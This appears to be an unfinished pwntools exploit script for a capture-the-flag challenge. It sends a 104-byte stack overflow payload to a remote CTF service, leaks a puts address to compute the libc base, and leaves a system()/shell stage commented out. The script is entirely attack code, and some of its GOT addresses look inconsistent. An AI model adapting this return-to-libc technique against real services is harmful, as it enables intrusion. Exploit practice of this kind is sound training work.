#!/usr/bin/env python

from pwn import *

# r = remote('127.0.0.1', 8888)
r = remote('csie.ctf.tw', 10114)

main = 0x804855c
puts_plt = 0x080483e0
puts_got = 0x08048380

read_plt = 0x08048390
read_got = 0x08048380

puts_off = 0x000314d0     # Ubuntu 14.04.2 /lib/i386-linux-gnu/libc.so.6
system_off = 0x0003fc40
gets_off = 0x00064ae0

# r.send('A'*104 + p32(puts_plt) + p32(main) + p32(puts_got) + '\n')
# # r.send('A'*104 + 
#     p32(gets) + p32(system) + p32(puts_got) + p32(puts_got) + '\n')
print '1'
r.send('A'*104 + p32(puts_plt) + p32(main) + p32(1) + p32(puts_got) + p32(8) + '\n')
# r.send('A'*104 + p32(read_plt) + p32(main) + p32(0) + p32(puts_got) + p32(4) + '\n')
print '2'
# r.interactive()
base = u32(r.recvline()[:4]) - puts_off
print base

# print 'libc base =', hex(base)

# system = base + system_off
# gets = base + gets_off 

# r.send('A'*104 + 
#     p32(gets) + p32(system) + p32(puts_got) + p32(puts_got) + '\n')

# r.interactive()
